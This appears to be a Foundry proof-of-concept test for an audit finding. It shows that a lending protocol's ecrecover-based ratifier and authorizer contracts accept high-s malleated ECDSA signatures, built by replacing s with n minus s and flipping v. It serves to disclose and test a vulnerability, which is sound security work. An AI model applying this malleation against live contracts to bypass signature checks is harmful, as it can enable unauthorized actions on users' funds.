// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.34;

import {BaseTest} from "../BaseTest.sol";
import {Offer, Market, CollateralParams} from "../../src/interfaces/IMidnight.sol";
import {CALLBACK_SUCCESS, LLTV_4, WAD} from "../../src/libraries/ConstantsLib.sol";
import {HashLib} from "../../src/ratifiers/libraries/HashLib.sol";
import {Signature as RatifierSignature} from "../../src/ratifiers/interfaces/IEcrecoverRatifier.sol";
import {
    Authorization,
    Signature as AuthorizationSignature,
    AUTHORIZATION_TYPEHASH,
    EIP712_DOMAIN_TYPEHASH as AUTHORIZER_DOMAIN_TYPEHASH
} from "../../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

import {console2} from "forge-std/console2.sol";

contract PoCSignatureMalleabilityTest is BaseTest {
    uint256 internal constant SECP256K1_N =
        0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;

    uint256 internal constant SECP256K1_HALF_N =
        0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0;

    function testPoC_RatifierAcceptsHighSMalleatedSignature() public {
        console2.log("");
        console2.log("============================================================");
        console2.log("PoC 1: EcrecoverRatifier accepts high-s malleated signature");
        console2.log("============================================================");

        console2.log("[1] Creating signed offer");
        Offer memory offer = _signedOffer(lender);

        console2.log("    lender / maker:", lender);
        console2.log("    offer.buy:", offer.buy);
        console2.log("    offer.maker:", offer.maker);
        console2.log("    offer.ratifier:", offer.ratifier);
        console2.log("    offer.maxUnits:", offer.maxUnits);
        console2.log("    offer.start:", offer.start);
        console2.log("    offer.expiry:", offer.expiry);
        console2.log("    market.loanToken:", offer.market.loanToken);
        console2.log("    market.maturity:", offer.market.maturity);
        console2.log("    collateral token:", offer.market.collateralParams[0].token);
        console2.log("    collateral oracle:", offer.market.collateralParams[0].oracle);
        console2.log("    collateral lltv:", offer.market.collateralParams[0].lltv);
        console2.log("    collateral maxLif:", offer.market.collateralParams[0].maxLif);

        console2.log("[2] Hashing offer into ratifier root");
        bytes32 root = HashLib.hashOffer(offer);
        console2.logBytes32(root);

        console2.log("[3] Creating canonical low-s signature from lender private key");
        RatifierSignature memory original =
            signature(root, privateKey[lender], address(ecrecoverRatifier), 0);

        console2.log("    original.v:", original.v);
        console2.logBytes32(original.r);
        console2.logBytes32(original.s);
        console2.log("    original.s uint:", uint256(original.s));
        console2.log("    secp256k1 half-n:", SECP256K1_HALF_N);

        console2.log("[4] Malleating signature");
        console2.log("    Formula: s' = secp256k1n - s");
        console2.log("    Formula: v' = 27 <-> 28");

        RatifierSignature memory malleated = RatifierSignature({
            v: _flipV(original.v),
            r: original.r,
            s: _malleatedS(original.s)
        });

        console2.log("    malleated.v:", malleated.v);
        console2.logBytes32(malleated.r);
        console2.logBytes32(malleated.s);
        console2.log("    malleated.s uint:", uint256(malleated.s));

        console2.log("[5] Checking preconditions");
        assertLe(
            uint256(original.s),
            SECP256K1_HALF_N,
            "test precondition: forge signature should be low-s"
        );
        console2.log("    OK: original signature is low-s");

        assertGt(
            uint256(malleated.s),
            SECP256K1_HALF_N,
            "malleated signature is high-s"
        );
        console2.log("    OK: malleated signature is high-s");

        console2.log("[6] Encoding ratifierData with malleated signature");
        bytes32[] memory proof = new bytes32[](0);
        bytes memory ratifierData = abi.encode(malleated, root, uint256(0), proof);

        console2.log("    proof length:", proof.length);
        console2.log("    ratifierData length:", ratifierData.length);

        console2.log("[7] Calling EcrecoverRatifier.isRatified from Midnight address");
        vm.prank(address(midnight));
        bytes32 result = ecrecoverRatifier.isRatified(offer, ratifierData);

        console2.log("[8] Ratifier result");
        console2.logBytes32(result);
        console2.log("    expected CALLBACK_SUCCESS:");
        console2.logBytes32(CALLBACK_SUCCESS);

        assertEq(
            result,
            CALLBACK_SUCCESS,
            "ratifier accepted the alternate high-s signature"
        );

        console2.log("[9] SUCCESS: Ratifier accepted a high-s malleated signature");
        console2.log("============================================================");
        console2.log("");
    }

    function testPoC_AuthorizerAcceptsHighSMalleatedSignature() public {
        console2.log("");
        console2.log("==============================================================");
        console2.log("PoC 2: EcrecoverAuthorizer accepts high-s malleated signature");
        console2.log("==============================================================");

        console2.log("[1] Allowing EcrecoverAuthorizer to manage borrower authorization");
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);

        console2.log("    borrower / authorizer:", borrower);
        console2.log("    ecrecoverAuthorizer:", address(ecrecoverAuthorizer));
        console2.log(
            "    Midnight says authorizer is authorized:",
            midnight.isAuthorized(borrower, address(ecrecoverAuthorizer))
        );

        address target = makeAddr("malleatedAuthorizationTarget");

        console2.log("[2] Building Authorization struct");
        Authorization memory authorization = Authorization({
            authorizer: borrower,
            authorized: target,
            isAuthorized: true,
            nonce: ecrecoverAuthorizer.nonce(borrower),
            deadline: block.timestamp + 1 days
        });

        console2.log("    authorization.authorizer:", authorization.authorizer);
        console2.log("    authorization.authorized:", authorization.authorized);
        console2.log("    authorization.isAuthorized:", authorization.isAuthorized);
        console2.log("    authorization.nonce:", authorization.nonce);
        console2.log("    authorization.deadline:", authorization.deadline);
        console2.log("    current block.timestamp:", block.timestamp);

        console2.log("[3] Computing EIP-712 struct hash");
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        console2.logBytes32(structHash);

        console2.log("[4] Computing EIP-712 domain separator");
        bytes32 domainSeparator =
            keccak256(abi.encode(AUTHORIZER_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));

        console2.log("    chainid:", block.chainid);
        console2.log("    verifying contract:", address(ecrecoverAuthorizer));
        console2.logBytes32(domainSeparator);

        console2.log("[5] Computing final digest");
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, structHash));
        console2.logBytes32(digest);

        console2.log("[6] Creating canonical low-s signature from borrower private key");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[borrower], digest);

        console2.log("    original.v:", v);
        console2.logBytes32(r);
        console2.logBytes32(s);
        console2.log("    original.s uint:", uint256(s));
        console2.log("    secp256k1 half-n:", SECP256K1_HALF_N);

        console2.log("[7] Malleating authorization signature");
        AuthorizationSignature memory malleated = AuthorizationSignature({
            v: _flipV(v),
            r: r,
            s: _malleatedS(s)
        });

        console2.log("    malleated.v:", malleated.v);
        console2.logBytes32(malleated.r);
        console2.logBytes32(malleated.s);
        console2.log("    malleated.s uint:", uint256(malleated.s));

        console2.log("[8] Checking preconditions");
        assertLe(
            uint256(s),
            SECP256K1_HALF_N,
            "test precondition: forge signature should be low-s"
        );
        console2.log("    OK: original signature is low-s");

        assertGt(
            uint256(malleated.s),
            SECP256K1_HALF_N,
            "malleated signature is high-s"
        );
        console2.log("    OK: malleated signature is high-s");

        console2.log("[9] State before submitting malleated authorization");
        console2.log(
            "    midnight.isAuthorized(authorizer, target):",
            midnight.isAuthorized(authorization.authorizer, authorization.authorized)
        );
        console2.log("    authorizer nonce before:", ecrecoverAuthorizer.nonce(borrower));

        console2.log("[10] Calling EcrecoverAuthorizer.setIsAuthorized with high-s signature");
        ecrecoverAuthorizer.setIsAuthorized(authorization, malleated);

        console2.log("[11] State after submitting malleated authorization");
        bool authorizedAfter = midnight.isAuthorized(authorization.authorizer, authorization.authorized);
        uint256 nonceAfter = ecrecoverAuthorizer.nonce(borrower);

        console2.log("    midnight.isAuthorized(authorizer, target):", authorizedAfter);
        console2.log("    authorizer nonce after:", nonceAfter);
        console2.log("    expected nonce after:", authorization.nonce + 1);

        assertTrue(
            authorizedAfter,
            "authorizer accepted the alternate high-s signature"
        );

        assertEq(
            nonceAfter,
            authorization.nonce + 1,
            "nonce should increment after accepted authorization"
        );

        console2.log("[12] SUCCESS: Authorizer accepted a high-s malleated signature");
        console2.log("==============================================================");
        console2.log("");
    }

    function _signedOffer(address maker) internal view returns (Offer memory offer) {
        CollateralParams[] memory collateralParams = new CollateralParams[](1);

        collateralParams[0] = CollateralParams({
            token: address(collateralToken1),
            lltv: LLTV_4,
            maxLif: WAD,
            oracle: address(oracle1)
        });

        offer.market = Market({
            loanToken: address(loanToken),
            collateralParams: collateralParams,
            maturity: block.timestamp + 30 days,
            rcfThreshold: 0,
            enterGate: address(0),
            liquidatorGate: address(0)
        });

        offer.buy = true;
        offer.maker = maker;
        offer.start = block.timestamp;
        offer.expiry = block.timestamp + 1 days;
        offer.ratifier = address(ecrecoverRatifier);
        offer.maxUnits = 1;
    }

    function _malleatedS(bytes32 s) internal pure returns (bytes32) {
        return bytes32(SECP256K1_N - uint256(s));
    }

    function _flipV(uint8 v) internal pure returns (uint8) {
        return v == 27 ? 28 : 27;
    }
}